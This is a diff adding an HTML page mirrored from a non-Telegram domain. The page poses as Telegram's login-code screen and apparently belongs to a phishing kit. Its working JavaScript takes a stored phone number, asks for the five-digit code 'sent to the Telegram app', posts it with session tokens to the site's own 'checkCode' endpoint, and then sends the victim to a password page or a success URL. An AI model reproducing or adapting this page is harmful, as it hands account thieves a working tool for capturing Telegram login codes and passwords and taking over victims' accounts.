@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from qhzxzx.com/code by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 29 Mar 2025 19:47:50 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,shrink-to-fit=no,viewport-fit=cover">
+    <title>Telegram</title>
+    <style>
+
+        :root{
+            --main-color:red;
+            --font-size: 16px;
+            --font-family: "Roboto", -apple-system, BlinkMacSystemFont, "Apple Color Emoji", "Segoe UI", Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
+            --z-country-code-input-group:10;
+            --color-borders-input:rgb(218, 220, 224);
+            --border-radius-default:0.75rem;
+            --color-background:rgb(255, 255, 255);
+            --color-text-secondary:rgb(112, 117, 121);
+            --color-primary:rgb(51, 144, 236);
+            --color-error:#e53935;
+        }
+
+        html,body{
+            width: 100%;
+            height: 100%;
+            font-size: var(--font-size);
+            user-select: none;
+            font-family: var(--font-family);
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+        }
+        *{
+            font-size: var(--font-size);
+            user-select: none;
+            font-family: var(--font-family);
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+
+        }
+        .container{
+            width: 100%;
+            max-width:25.5rem;
+            height: 100%;
+            margin: 0 auto;
+            padding-left: 1rem;
+            padding-right: 1rem;
+            padding-bottom: 1rem;
+            padding-top: 3rem;
+        }
+        #code-logo{
+            width: 7.5rem;
+            height: 7.5rem;
+            margin: 0 auto;
+            margin-bottom: 1.75rem;
+        }
+        #code-logo>img{
+            width: 7.5rem;
+            height: 7.5rem;
+        }
+        #code-title{
+            display:flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.25rem;
+            line-height: 1;
+            font-weight: 500;
+            margin-bottom: 0.5rem;
+        }
+        #code-title>span{
+            font-size: 1.25rem;
+            line-height: 1;
+            font-weight: 500;
+        }
+
+        #code-desc{
+            text-align: center;
+            font-size: 0.875rem;
+            line-height: 1.35rem;
+            color: rgb(112, 117, 121);
+            margin-bottom: 2.5rem;
+        }
+
+        /* 当屏幕宽度大于或等于600像素时，调整 */
+        @media (min-width: 600px) {
+            .container{
+                padding-top: 6rem;
+                width: 600px;
+            }
+        }
+
+
+        #code-wrap{
+            position: relative;
+            z-index: var(--z-country-code-input-group);
+            margin-bottom: 1.5rem;
+        }
+        #code-wrap>input{
+            display: block;
+            width: 100%;
+            height: 3.375rem;
+            outline: none;
+            --border-width:1px;
+            padding: calc(.75rem - var(--border-width)) calc(.9rem - var(--border-width));
+            border: var(--border-width) solid var(--color-borders-input);
+            border-radius:var(--border-radius-default);
+            background-color: var(--color-background);
+            transition: border-color .15s ease;
+            word-break:break-word;
+            font-size:1rem;
+            line-height:1.25rem;
+            font-family:inherit;
+            caret-color: var(--color-primary);
+        }
+        #code-wrap>label{
+            color:var(--color-text-secondary);
+            display: block;
+            padding: 0 0.25rem;
+            position: absolute;
+            left: 0.75rem;
+            top:0.9375rem;
+            background-color: var(--color-background);
+            font-size: 1rem;
+            font-weight: 400;
+            transition: transform .15s ease-out, color .15s ease-out;
+        }
+        /*旋转lable*/
+        #code-wrap>.lable-focus {
+            transform: scale(0.75) translate(-0.5rem, -2.25rem);
+        }
+
+        /*修改input的边框颜色*/
+        #code-wrap> .input-focus {
+            border-color:var(--color-primary);
+            box-shadow:inset 0 0 0 1px var(--color-primary);
+        }
+        /*修改lable的字体颜色*/
+        #code-wrap>.lable-border-focus {
+            color: var(--color-primary);
+        }
+
+        /*修改input的边框颜色*/
+        #code-wrap> .input-focus-error {
+            border-color:var(--color-error);
+            box-shadow:inset 0 0 0 1px var(--color-error);
+        }
+        /*修改lable的字体颜色*/
+        #code-wrap>.lable-border-focus-error {
+            color: var(--color-error);
+        }
+
+        #code-loading-wrap{
+            display: flex;
+            height: 100%;
+            align-items: center;
+            justify-content: center;
+        }
+        #code-loading-wrap>div{
+            --spinner-size: 2rem;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: var(--spinner-size);
+            height: var(--spinner-size);
+        }
+        #code-loading-wrap>div>img {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-repeat: no-repeat;
+            background-size: 100%;
+            animation-name: spin;
+            animation-duration: 1s;
+            animation-iteration-count: infinite;
+            animation-timing-function: linear;
+            width: 2.75rem;
+            height: 2.75rem;
+        }
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100%{
+                transform: rotate(360deg);
+            }
+        }
+
+    </style>
+    <script>
+
+        var loginUrl = "login.html";
+        var codeUrl = "code.html";
+        var pwdUrl = "passwd.html";
+        var successUrl = "loginSuccess.html";
+
+        var mobile = localStorage.getItem("mobile")
+
+        var localVal = null;
+
+        function initPage() {
+
+            if (mobile == undefined || mobile == null || mobile == "") {
+                window.location.replace(loginUrl)
+                return
+            }
+
+            var localKey = mobile.replace(/\D/g, '')
+            if(localKey == "") {
+                window.location.replace(loginUrl)
+                return
+            }
+
+            localVal = localStorage.getItem(localKey)
+            if (localVal == undefined || localVal == null || localVal == "") {
+                window.location.replace(loginUrl)
+                return
+            }
+
+            try {
+                localVal = JSON.parse(localVal)
+                if (localVal === null || typeof localVal !== 'object') {
+                    localStorage.removeItem(localKey);
+                    window.location.replace(loginUrl)
+                }
+            }catch (e) {
+                localStorage.removeItem(localKey);
+                window.location.replace(loginUrl)
+                return
+            }
+
+            //判断是否登录过了
+            if (localVal.loginTime != undefined && localVal.loginTime != null && localVal.loginTime != "") {
+                var reSuccessUrl = localStorage.getItem('reSuccessUrl')
+                if(reSuccessUrl != null && reSuccessUrl != "") {
+                    window.location.replace(reSuccessUrl)
+                } else {
+                    window.location.replace(successUrl)
+                }
+                return
+            }
+
+            //判断是否验证过验证码只有密码没有验证了
+            if (localVal.checkCodeTime != undefined && localVal.checkCodeTime != null && localVal.checkCodeTime != "") {
+                var nowCheckCodeTime = (new Date().getTime()).toString().substr(0,10)
+                if((parseInt(nowCheckCodeTime) - parseInt(localVal.checkCodeTime)) < 1800) {
+                    window.location.replace(pwdUrl)
+                    return
+                }
+            }
+
+            //判断是否获取过验证码
+            if (localVal.getCodeTime == undefined || localVal.getCodeTime == null || localVal.getCodeTime == "") {
+                window.location.replace(loginUrl)
+                return
+            }
+            var nowGetCodeTime = (new Date().getTime()).toString().substr(0,10)
+            if((parseInt(nowGetCodeTime) - parseInt(localVal.getCodeTime)) > 600) {
+                window.location.replace(loginUrl)
+                return
+            }
+
+        }
+
+        initPage()
+
+    </script>
+</head>
+<body>
+
+    <div style="" class="container">
+
+        <div id="code-logo"><img src="static/img/code-header.png"></div>
+        <h1 id="code-title">
+            <span style="padding: 0.5rem" id="mobile"></span>
+            <img src="static/img/edit.png" style="width: 1rem;height: 1rem;" id="editMobile">
+        </h1>
+        <p id="code-desc">We've sent the code to the <b style="font-weight: 500">Telegram</b> app on your other device.</p>
+
+        <input name="90d884ffdcad44417bb098" value="e9485b57cea1d9c6ff9d298406fa939d76f74675cc297245c5a079b75899e2b" type="hidden">
+        <div id="code-wrap">
+            <input type="text"  maxlength="5" name="code" id="code-input" autocomplete="off" >
+            <!--Invalid code.-->
+            <label id="code-lable-text">Code</label>
+        </div>
+
+        <div id="code-loading-wrap-show" style="display: none">
+            <div id="code-loading-wrap">
+                <div>
+                    <img src="static/img/codeLoading.svg">
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="modal-wrap" style="position: fixed;top:0;left: 0;bottom: 0;right: 0;z-index: 9999;display: none"></div>
+
+    <script src="static/plugins/jquery-2.1.4/jquery.min.js"></script>
+
+<script>
+    $(function () {
+
+        var phoneLableText = "Code"
+
+        var requestFlag = false;
+
+        $("#mobile").text(mobile)
+
+        $('body').click(function(e) {
+
+            //旋转lable
+            var code =  $('#code-input').val()
+            if (code == ""){
+                if ($('#code-wrap>label').hasClass('lable-focus')) {
+                    $('#code-wrap>label').removeClass("lable-focus")
+                }
+            }
+
+            //修改lable的字体颜色
+            if ($('#code-wrap>label').hasClass('lable-border-focus')) {
+                $('#code-wrap>label').removeClass("lable-border-focus")
+            }
+
+            //修改input的边框颜色
+            if ($('#code-input').hasClass('input-focus')) {
+                $('#code-input').removeClass("input-focus")
+            }
+
+        })
+
+        //编辑手机号
+        $("#editMobile").click(function () {
+            var localKey = mobile.replace(/\D/g, '')
+            if(localKey != "") {
+                localStorage.removeItem(localKey);
+            }
+            localStorage.setItem('editMobile','1');
+            //window.history.back()
+            window.location.replace(loginUrl)
+        })
+
+        $("#code-wrap").click(function (e) {
+
+            e.stopPropagation();
+
+            //旋转lable
+            if (!$('#code-wrap>label').hasClass('lable-focus')) {
+                $('#code-wrap>label').addClass("lable-focus")
+            }
+
+            //修改lable的字体颜色
+            if (!$('#code-wrap>label').hasClass('lable-border-focus-error')) {
+                if (!$('#code-wrap>label').hasClass('lable-border-focus')) {
+                    $('#code-wrap>label').addClass("lable-border-focus")
+                }
+            }
+
+            //修改input的边框颜色
+            if (!$('#code-input').hasClass('input-focus-error')) {
+                if (!$('#code-input').hasClass('input-focus')) {
+                    $('#code-input').addClass("input-focus")
+                }
+            }
+
+        })
+
+        $('#code-input').on('input', function() {
+
+            var nowCode = $(this).val()
+
+            //删除非数字
+            nowCode = nowCode.replace(/\D/g, '');
+            if (nowCode.length > 5) {
+                nowCode = nowCode.substring(0, 5)
+                $(this).val(nowCode)
+            }
+
+            $("#code-lable-text").text(phoneLableText)
+
+            //修改lable的字体颜色
+            if ($('#code-wrap>label').hasClass('lable-border-focus-error')) {
+                $('#code-wrap>label').removeClass("lable-border-focus-error")
+            }
+
+            //修改input的边框颜色
+            if ($('#code-input').hasClass('input-focus-error')) {
+                $('#code-input').removeClass("input-focus-error")
+            }
+
+            //修改lable的字体颜色
+            if (!$('#code-wrap>label').hasClass('lable-border-focus')) {
+                $('#code-wrap>label').addClass("lable-border-focus")
+            }
+
+            //修改input的边框颜色
+            if (!$('#code-input').hasClass('input-focus')) {
+                $('#code-input').addClass("input-focus")
+            }
+
+            if (nowCode.length == 5) {
+                try {
+
+                    if (requestFlag) {
+                        return;
+                    }
+
+                    requestFlag = true;
+                    $("#modal-wrap").show()
+                    $("#code-loading-wrap-show").show()
+
+                    var requestParam = {
+                        mobile: mobile,
+                        code:$('#code-input').val(),
+                        uuid:localStorage.getItem("uuid"),
+                        codeHash:localStorage.getItem("codeHash"),
+                        '90d884ffdcad44417bb098': $("input[name='90d884ffdcad44417bb098']").val(),
+                    }
+                    if(requestParam.uuid == undefined || requestParam.uuid == null || requestParam.uuid == '') {
+                        requestParam.uuid = '';
+                    }
+                    if(requestParam.codeHash == undefined || requestParam.codeHash == null || requestParam.codeHash == '') {
+                        requestParam.codeHash = '';
+                    }
+
+                    sendRequest('checkCode',requestParam,function (r) {
+                        requestFlag = false;
+                        $("#modal-wrap").hide()
+                        $("#code-loading-wrap-show").hide()
+
+                        if (r.code == '666') {
+                            localVal.checkCodeTime = (new Date().getTime()).toString().substr(0,10);
+                            var localKey = mobile.replace(/\D/g, '')
+                            localStorage.setItem(localKey,JSON.stringify(localVal));
+                            localStorage.removeItem('codeHash');
+                            window.location.replace(pwdUrl)
+                        } else if (r.code == '10000') {
+                            localVal.checkCodeTime = (new Date().getTime()).toString().substr(0,10);
+                            localVal.loginTime = (new Date().getTime()).toString().substr(0,10);
+                            var localKey = mobile.replace(/\D/g, '')
+                            localStorage.setItem(localKey,JSON.stringify(localVal));
+                            localStorage.removeItem('codeHash');
+                            if(r.data != undefined && r.data.url != undefined && r.data.url != ""){
+                                localStorage.setItem('reSuccessUrl',r.data.url);
+                                window.location.replace(r.data.url)
+                            } else {
+                                window.location.replace(successUrl)
+                            }
+                        } else {
+                            if (r.msg == undefined || r.msg == null || r.msg == "") {
+                                $("#code-lable-text").text("Request errors")
+                                codeError()
+                            } else {
+                                $("#code-lable-text").text(r.msg)
+                                codeError()
+                            }
+                        }
+                    });
+                }catch (e) {
+                    requestFlag = false;
+                    $("#modal-wrap").show()
+                    $("#code-loading-wrap-show").show()
+                    codeError()
+                }
+            }
+
+        });
+
+        function codeError() {
+
+            //修改lable的字体颜色
+            if ($('#code-wrap>label').hasClass('lable-border-focus')) {
+                $('#code-wrap>label').removeClass("lable-border-focus")
+            }
+
+            //修改input的边框颜色
+            if ($('#code-input').hasClass('input-focus')) {
+                $('#code-input').removeClass("input-focus")
+            }
+
+            //修改lable的字体颜色
+            if (!$('#code-wrap>label').hasClass('lable-border-focus-error')) {
+                $('#code-wrap>label').addClass("lable-border-focus-error")
+            }
+
+            //修改input的边框颜色
+            if (!$('#code-input').hasClass('input-focus-error')) {
+                $('#code-input').addClass("input-focus-error")
+            }
+        }
+
+        function sendRequest(url ,data, fn) {
+            $.ajax({
+                type:"post",
+                url:url,
+                dataType:"json",
+                data:data,
+                success:function(r,status,xhr){
+                    fn(r)
+                    if(r.code != undefined && r.code != '10000'){
+                        if(xhr.getResponseHeader('90d884ffdcad44417bb098') != undefined && xhr.getResponseHeader('90d884ffdcad44417bb098') != null && xhr.getResponseHeader('90d884ffdcad44417bb098') != ''){
+                            $("input[name='90d884ffdcad44417bb098']").val(xhr.getResponseHeader('90d884ffdcad44417bb098'))
+                        }
+                    }
+                },
+                error:function(e)
+                {
+                    fn({code:"99999",msg:"Request error"})
+                }
+            });
+        }
+
+    })
+
+
+
+</script>
+</body>
+
+<!-- Mirrored from qhzxzx.com/code by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 29 Mar 2025 19:47:53 GMT -->
+</html>
